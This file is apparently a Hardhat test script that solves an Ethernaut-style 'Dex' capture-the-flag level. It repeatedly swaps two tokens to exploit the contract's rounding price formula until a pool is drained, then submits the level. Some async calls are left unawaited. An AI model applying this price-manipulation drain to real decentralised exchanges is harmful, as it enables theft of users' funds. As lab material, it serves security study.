import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel, bigNumberToEther,
         logEvents, dumpStorage } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Dex`);
  const challengeAddress = await createChallenge(
    `0x0b0276F85EF92432fBd6529E169D9dE4aD337b1F`
    // IMPORTANT: Some contracts will need a second argument specifying how
    // much value that should have in them on creation. e.g. Reentrance level e.g.
    // , ethers.utils.parseEither("0.001")
  );

  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
  const eoaAddress = await eoa.getAddress();
  challenge.approve(challenge.address, 1000);
  challenge.approve(eoaAddress, 1000);

  let token1 = await challenge.token1();
  let token2 = await challenge.token2();

  let swappingToken1: boolean = false;
  let i;

  const amountExpected = (n: number) => {
    return Math.floor((n * 110) / (110 - n));
  };


  const amountToSwap = (n : number) => {
      if (amountExpected(n) < 110) {
          return n;
      } else {
          return 110 - n;
      }

  };


  challenge.add_liquidity(token1, 10);
  let complete: boolean = false;
  while (!complete) {
    const tokenA = swappingToken1 ? token1 : token2;
    const tokenB = swappingToken1 ? token2 : token1;
    const balance = (await challenge.balanceOf(tokenA, eoaAddress)).toNumber();

    console.log("-----");
    console.log("swapping", amountToSwap(balance));

    tx = await challenge.swap(tokenA, tokenB, amountToSwap(balance));
    await tx.wait();

    swappingToken1 = !swappingToken1;
    let challengeToken1Bal = (await challenge.balanceOf(token1, challenge.address)).toNumber();
    let challengeToken2Bal = (await challenge.balanceOf(token2, challenge.address)).toNumber();
    
    console.log("challenge token1 balance", challengeToken1Bal);
    console.log("challenge token2 balance", challengeToken2Bal);
    console.log("player token1 balance", (await challenge.balanceOf(token1, eoaAddress)).toNumber());
    console.log("player token2 balance", (await challenge.balanceOf(token2, eoaAddress)).toNumber());

    if (challengeToken1Bal == 0 || challengeToken2Bal == 0) {
        complete = true;
    }
}

});

after(async () => {
  expect(await submitLevel(challenge.address), "level should be solved").to.be.true;
});
